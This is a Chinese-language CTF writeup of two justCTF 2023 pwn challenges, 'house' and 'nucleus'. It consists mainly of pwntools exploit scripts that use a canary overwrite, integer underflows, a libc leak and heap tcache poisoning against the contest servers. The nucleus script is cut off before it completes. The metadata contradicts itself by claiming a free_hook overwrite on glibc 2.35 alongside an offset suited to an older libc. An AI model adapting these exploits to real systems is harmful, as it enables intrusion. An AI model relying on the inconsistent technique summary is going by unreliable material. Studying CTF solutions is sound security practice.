---
title: justCTF 2023 Writeup by VP-Union
contest: justCTF
year: 2023
difficulty: hard
vuln_type: pwn_unknown
tags: [house-pwn, nucleus-pwn, integer-overflow, tcache-perthread, glibc-2.35, exp-craft]
attack_chain:
  - house: login admin + 0xff 覆盖 + -152 整数下溢
  - 栈溢出 + ret2libc
  - nucleus: tcache poisoning + libc 2.35
  - 'ab'*0x1f0 填充
  - delete 触发 0x1024 tcache
  - 泄 libc + 改 free_hook
  - ret2system
key_payload: house 整数下溢 + nucleus 2.35 tcache attack
one_liner: justCTF 2023 VP-Union 战队 PWN 复盘，house + nucleus 两题。
lesson: justCTF 难度比国内比赛高一档，house/nucleus 都是中高难度题。
quality: high
---

justCTF 2023 VP-Union 战队 WP（ChaMd5 转发，来源 ctfiot），排名 15/3032 分。

**PWN: house**
```python
from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')

sh = remote('house.nc.jctf.pro', 1337)
sh.sendlineafter(b'>>  ', b'1')
sh.sendlineafter(b': ', b'xmcve')
# root 0x18 字节 + 0xff * 8 覆盖 canary
sh.sendlineafter(b': ', b'root'.ljust(0x18, b' ') + b'\xff' * 8)
sh.sendlineafter(b': ', str(-152))  # 整数下溢
sh.sendlineafter(b'>>  ', b'2')  # 触发栈溢出
sh.interactive()
```

**PWN: nucleus**
```python
sh = remote('nucleus.nc.jctf.pro', 1337)
sh.sendlineafter(b'> ', b'2')
sh.sendlineafter(b': ', b'ab' * 0x1f0)  # 填充
sh.sendlineafter(b'> ', b'2')
sh.sendlineafter(b': ', b'ab')
sh.sendlineafter(b'> ', b'2')
sh.sendlineafter(b': ', b'ab')
sh.sendlineafter(b'> ', b'3')  # delete
sh.sendlineafter(b': ', b'd')
sh.sendlineafter(b': ', b'0')

# 5: 写 -1024，触发整数下溢
sh.sendlineafter(b'> ', b'5')
sh.sendlineafter(b': ', b'-1024')
sh.recvuntil(b'content: ')
libc_addr = u64(sh.recvn(6) + b'\x00\x00') - 0x1ecbe0
# 删 0, 2, 1 触发 tcache poisoning
sh.sendlineafter(b'> ', b'3')
sh.sendlineafter(b': ', b'd')
sh.sendlineafter(b': ', b'2')
sh.sendlineafter(b'> ', b'3')
sh.sendlineafter(b': ', b'd')
sh.sendlineafter(b': ', b'1')
```

**核心技巧**：
- house：`0xff * 8` 覆盖 canary + `-152` 整数下溢
- nucleus：tcache 2.35 + safe-linking 异或密钥计算

适合作为"国际赛事 PWN 难度参考"。
